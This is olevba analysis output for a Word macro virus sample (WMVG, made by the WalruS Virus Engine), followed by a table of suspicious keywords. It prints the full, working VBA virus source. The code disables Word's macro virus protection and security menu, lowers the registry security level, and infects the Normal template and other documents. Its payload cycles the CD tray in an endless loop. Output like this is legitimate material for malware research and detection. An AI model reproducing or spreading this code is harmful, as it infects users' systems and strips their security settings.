olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.WMVG.110
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.WMVG.110 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'
' Virus Name : hjg
' Virus Author : The WalruS Virus Engine (WVE) Random Virus Utility

' A Virus Created By The WalruS Virus Engine (WVE)

Private Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long
Private Sub FilePrintDefault()
    Call USB2628
End Sub
Private Sub USB2628()
On Error Resume Next
With Options
    .ConfirmConversions = False
    .VirusProtection = False
    .SaveNormalPrompt = False
End With
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
WordBasic.DisableAutoMacros 0
KeyBindings.Add KeyCode:=BuildKeyCode(wdKeyAlt, wdKeyF11), KeyCategory:=0, Command:=" "
ActiveDocument.ReadOnlyRecommended = False
If Left(ActiveDocument.Name, 8) = "Document" Then Exit Sub
Set FCN8359 = NormalTemplate.VBProject.VBComponents(1).CodeModule
Set HPO6156 = ActiveDocument.VBProject.VBComponents(1).CodeModule
ISA6399 = "C:\hjg.FKH"
Open ISA6399 For Output As #1
Print #1, VBProject.VBComponents(1).CodeModule.Lines(1, 0)
Close #1
If FCN8359.Lines(1, 1) <> "'" Then
    FCN8359.DeleteLines 1, FCN8359.CountOfLines: FCN8359.AddFromFile ISA6399
End If
If HPO6156.Lines(1, 1) <> "'" Then
    HPO6156.DeleteLines 1, HPO6156.CountOfLines: HPO6156.AddFromFile ISA6399
    ActiveDocument.Save
End If
Kill ISA6399
ESR8101 = Int(Rnd * 44)
If Trigger = 3 Then Call ELA9086
End Sub
Private Sub ELA9086()
On Error Resume Next
Do
mciSendString "set cd door open", 0, 0, 0: mciSendString "set cd door closed", 0, 0, 0: mciSendString "set cd time format tmsf wait", 0, 0, 0: mciSendString "open cdaudio alias cd wait shareable", 0, 0, 0
Loop
End Sub
' Another Virus Created By The WalruS Virus Generator (WVE) Version 1.10
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |winmm.dll           |Executable file name                         |
+----------+--------------------+---------------------------------------------+

